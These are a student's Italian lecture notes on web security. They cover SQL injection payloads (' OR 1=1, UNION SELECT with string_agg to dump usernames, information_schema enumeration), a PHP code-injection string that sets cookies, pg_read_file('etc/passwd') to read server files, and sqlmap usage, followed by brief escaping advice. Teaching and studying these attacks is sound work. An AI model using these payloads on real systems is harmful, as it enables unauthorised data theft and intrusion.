---
id: '17'
lezione: "20231123"
title: "Web security - 2"
author: "Sam. K."
keywords: 
---

<style>
    strong{
        background-color:#faf43e;
        color: black;
        padding:0.1rem 0.2rem;
        border-radius:5px;
    }
</style>

# Web security - 2

docker exec -it <name> /bin/sh
per accedere al container con bash

## SQL injection

    ' OR 1=1; --

    -- commento; SQL comment

    $query = mysql_query("SELECT * FROM login_tb WHERE username='$username' AND password='$password'");
    '");setcookie('us',"ciao",time()+60);setcookie('ps',"ciao",time()+60);header('location: uploader.php');//'");

    setcookie('us',"ciao",time()+60);
    setcookie('ps',"ciao",time()+60);

    header('location: uploader.php');

    union select 1, string_agg(username,','), 1 from users * :

    string_agg string aggregate (1ora 06min) aggrega tutto con una virgola, l'attaccante pensa sempre che ci sia un LIMIT 1
    quindi string_agg restituisce i risultati della query come una riga con entry separate con una virgola

    selet * somethin,somethin from table_name union select something,somethin from table_name;

union deve avere delle colonne che hanno la stessa grandezza

select * from <table_name> order by <col_number>

    union select 1,NULL,NULL; per scoprire se la prima colonna è numerico ignorando il resto delle colonne

    select column_name from information_schema.columns  
    select table_name from information_schema.tables

information_schema è normalmente protetta con un controllo degli accessi, 

sql injections payload

1ora 14min

stampa le directory
union select null,pg_isdir('/bin'), null from pg_stat_user_tables --
pg_read_file('etc/passwd') legge il file

sql map un tool per automatizzare l'attacco e testare una serie di payload
https://github.com/sqlmapproject/sqlmap

python3 sqlmap.py -u "url"

htmlspecialcharcters() per fare scape delle special chars


    
